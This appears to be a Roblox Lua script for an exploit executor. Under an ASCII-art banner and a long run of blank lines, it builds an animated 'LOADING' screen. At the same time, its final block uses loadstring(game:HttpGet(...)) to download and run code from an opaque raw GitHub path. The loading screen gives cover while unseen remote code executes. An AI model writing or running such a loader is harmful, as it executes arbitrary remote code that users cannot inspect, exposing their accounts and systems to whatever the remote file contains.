--[[
=====================================
====  =============      ============
===    ===========  ====  ===========
==  ==  ==========  ====  =======  ==
=  ====  ==  = ====  =======  ==    =
=  ====  ==     =====  ==========  ==
=        ==  =  =======  ===  ===  ==
=  ====  ==  =  ==  ====  ==  ===  ==
=  ====  ==  =  ==  ====  ==  ===  ==
=  ====  ==  =  ===      ===  ===   =
=====================================
]]










































































































































































































task.spawn(function()

	local TweenService = game:GetService("TweenService")
	local Players = game:GetService("Players")

	local Player = Players.LocalPlayer
	local PlayerGui = Player:WaitForChild("PlayerGui")

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "AdvancedLoadingUI"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.IgnoreGuiInset = true
	ScreenGui.Parent = PlayerGui

	local Background = Instance.new("Frame")
	Background.Size = UDim2.new(1,0,1,0)
	Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
	Background.BackgroundTransparency = 1
	Background.Parent = ScreenGui

	local Main = Instance.new("Frame")
	Main.AnchorPoint = Vector2.new(0.5,0.5)
	Main.Position = UDim2.new(0.5,0,0.5,0)
	Main.Size = UDim2.new(0,0,0,0)
	Main.BackgroundColor3 = Color3.fromRGB(0,0,0)
	Main.BorderSizePixel = 0
	Main.Parent = Background

	local MainCorner = Instance.new("UICorner")
	MainCorner.CornerRadius = UDim.new(0,18)
	MainCorner.Parent = Main

	local MainStroke = Instance.new("UIStroke")
	MainStroke.Color = Color3.fromRGB(255,255,255)
	MainStroke.Thickness = 1.5
	MainStroke.Parent = Main

	local Title = Instance.new("TextLabel")
	Title.BackgroundTransparency = 1
	Title.Size = UDim2.new(1,0,0,50)
	Title.Position = UDim2.new(0,0,0,30)
	Title.Font = Enum.Font.GothamBlack
	Title.Text = "LOADING"
	Title.TextSize = 32
	Title.TextColor3 = Color3.fromRGB(0,0,0)
	Title.Parent = Main

	local TitleStroke = Instance.new("UIStroke")
	TitleStroke.Color = Color3.fromRGB(255,255,255)
	TitleStroke.Thickness = 1.5
	TitleStroke.Parent = Title

	local LoadingBarBG = Instance.new("Frame")
	LoadingBarBG.AnchorPoint = Vector2.new(0.5,0.5)
	LoadingBarBG.Position = UDim2.new(0.5,0,0.7,0)
	LoadingBarBG.Size = UDim2.new(0.8,0,0,24)
	LoadingBarBG.BackgroundColor3 = Color3.fromRGB(15,15,15)
	LoadingBarBG.BorderSizePixel = 0
	LoadingBarBG.Parent = Main

	local BarCorner1 = Instance.new("UICorner")
	BarCorner1.CornerRadius = UDim.new(1,0)
	BarCorner1.Parent = LoadingBarBG

	local BarStroke = Instance.new("UIStroke")
	BarStroke.Color = Color3.fromRGB(255,255,255)
	BarStroke.Thickness = 1.3
	BarStroke.Parent = LoadingBarBG

	local LoadingBar = Instance.new("Frame")
	LoadingBar.Size = UDim2.new(0,0,1,0)
	LoadingBar.BackgroundColor3 = Color3.fromRGB(0,255,100)
	LoadingBar.BorderSizePixel = 0
	LoadingBar.Parent = LoadingBarBG

	local BarCorner2 = Instance.new("UICorner")
	BarCorner2.CornerRadius = UDim.new(1,0)
	BarCorner2.Parent = LoadingBar

	Background.BackgroundTransparency = 1
	Main.Size = UDim2.new(0,0,0,0)

	TweenService:Create(
		Background,
		TweenInfo.new(0.6),
		{BackgroundTransparency = 0.25}
	):Play()

	TweenService:Create(
		Main,
		TweenInfo.new(0.9, Enum.EasingStyle.Back),
		{Size = UDim2.new(0,500,0,220)}
	):Play()

	task.wait(1)

	local start = tick()

	while tick() - start < 1 do
		local progress = math.clamp((tick() - start) / 1, 0, 1)

		LoadingBar:TweenSize(
			UDim2.new(progress,0,1,0),
			Enum.EasingDirection.Out,
			Enum.EasingStyle.Linear,
			0.1,
			true
		)

		task.wait()
	end

	TweenService:Create(
		Main,
		TweenInfo.new(0.7, Enum.EasingStyle.Quint),
		{
			Size = UDim2.new(0,0,0,0),
			Rotation = 8
		}
	):Play()

	TweenService:Create(
		Background,
		TweenInfo.new(0.8),
		{BackgroundTransparency = 1}
	):Play()

	task.wait(1)

	ScreenGui:Destroy()

end)

task.spawn(function()

	loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeoneDoingSomething01/ThatsAGoodRepo/refs/heads/main/T3HqPomiHraCzkLT"))()

end)
